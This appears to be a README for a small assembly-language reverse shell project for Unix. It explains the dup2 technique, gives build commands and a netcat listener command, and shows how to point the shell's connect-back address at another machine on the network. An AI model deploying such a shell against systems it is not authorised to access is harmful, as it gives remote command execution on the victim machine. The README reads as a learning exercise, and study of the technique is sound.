# assembly-Reverse-Shell
I created a simple reverse shell in assembly language for Unix systems.

The goal is to create a socket on PC1 and establish a connection to PC2. We will use the [dup2](https://man7.org/linux/man-pages/man2/dup2.2.html) syscall with the socket's file descriptor as the old file descriptor, and stdin, stdout, and stderr as the new file descriptors. This setup allows PC2 to execute commands on PC1.

# How to use it on your own pc

Compile reverse_shell.s with `nasm -f elf64 reverse_shell.s -o reverse_shell.o` and `ld reverse_shell.o -o reverse_shell`

Now open two terminals, do `nc -l 6969` to TERM1 and `./reverse_shell` to TERM2.

You can now do commands from TERM1 to TERM2!

# How to use it with two pc on the same network
Convert PC1's ip and port to little-endian format.

Replace the information on lines 18 and 19 in your assembly file:
```asm
at sin_port,    dw 0x391B
at sin_addr,    dd 0x100007f
```
Open netcat on PC1 with `nc -l <PORT>`

Launch binary on PC2 with `./reverse_shell`

PC1 can now exec commands on PC2!
